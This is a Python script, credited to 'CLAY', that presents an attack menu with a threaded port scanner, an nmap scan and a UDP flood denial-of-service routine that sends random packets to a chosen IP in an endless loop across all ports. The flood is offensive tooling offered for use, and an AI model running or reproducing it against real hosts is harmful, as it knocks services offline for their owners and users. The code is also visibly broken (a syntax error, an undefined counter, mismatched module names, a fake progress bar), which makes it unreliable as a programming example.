from queue import Queue
import nmap
import socket
import threading
import socket
import os
import time
import random
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
   
o = '\033[33m'
b = '\033[34m'
g = '\033[32m'
p = '\033[35m'
c = '\033[36m'
t = '\033[93m'
gr = '\033[37m'
r='\033[31m'
    

os.system("clear")

print(b + "                 \                /")
print(g + "                  \              /")
print(p + "                   \            /")
print(t + "                    \    /\    /")
print(c + "                     \  /  \  /")
print(o + "                      \/    \/")


print(r + "----------------------------------------------------------")
print("                 	Made By CLAY")          	
print(r + "----------------------------------------------------------")

print(r + "		ATTACK-MENU")
print(r + "")
print(r + "1:   port scanner")		
print(r + "2:   dos-attack")	
print(r + "3:   nmap port scanner"

atk = input(">_ ")

if atk == "2" :
   os.system("clear")				
   print("          ___ ____________")
   print("             |            |")
   print("             |            |")
   print("             |            |")
   print("             |            |")
   print("             |            |")
   print("         ____|____________|")
   print("")

   at = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   datas = random._urandom(1490)

   os.system("figlet CLAY's DDos Attack")
   print
            


   ip = input("IP Target : ")
   port = input("Port       : ")
       


   print("-                                                                                                    1%")
   time.sleep(2)
   print("----------                                                                                                    10%")
   time.sleep(3)
   print("------------------                                                                                                  23%")
   time.sleep(1)
   print("---------------------------------------------------------------------    99%")
   time.sleep(5)
   print("----------------------------------------------------------------------   100%")



   os.system("figlet Attack Starting")
   data = 0
   while True:
        at.sendto(datas, (ip,port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s")%(data,ip,port)
        if port == 65534:
          port = 0
	      				              	      													  		 


elif atk == "1" :
     os.system("clear")


     target = input("Enter Target ip: ")
     queue = Queue()
     open_ports = []

     def portscan(port):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target, port))
             return True
         except:
             return False

     def get_ports(mode):
         if mode == 1:
             for port in range(1, 1024):
                 queue.put(port)
         elif mode == 2:
             for port in range(1, 49152):
                 queue.put(port)
         elif mode == 3:
             ports = [20, 21, 22, 23, 25, 53, 80, 110, 443]
             for port in ports:
                 queue.put(port)
         elif mode == 4:
             ports = input("Enter your ports (seperate by blank):")
             ports = ports.split()
             ports = list(map(int, ports))
             for port in ports:
                 queue.put(port)

     def worker():
         while not queue.empty():
             port = queue.get()
             if portscan(port):
                 print("Port {} is open!".format(port))
                 open_ports.append(port)
             else:
                 print("Port {} is closed!".format(port))
								 
     def run_scanner(threads, mode):

         get_ports(mode)

         thread_list = []

         for t in range(threads):
             thread = threading.Thread(target=worker)
             thread_list.append(thread)

         for thread in thread_list:
             thread.start()

         for thread in thread_list:
             thread.join()

         print("Open ports are:", open_ports)

     run_scanner(100, 1)


elif atk == "3" :

     domain = input("Enter Domain Name: ")
                       				
     nmap = nmap3.Nmap()
     port_scan = nmap.scan_top_ports(domain)
     print(port_scan)
